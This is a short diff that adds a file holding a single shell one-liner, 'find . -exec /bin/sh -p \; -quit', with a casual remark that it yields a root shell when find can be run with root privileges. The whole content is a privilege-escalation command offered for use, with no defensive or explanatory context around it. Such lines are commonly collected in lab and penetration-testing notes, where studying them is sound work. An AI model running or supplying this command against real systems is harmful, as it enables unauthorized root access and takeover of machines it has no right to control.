@@ -1,0 +1,3 @@
+find . -exec /bin/sh -p \; -quit
+
+this should give you root if you are able to run it as root!!!!
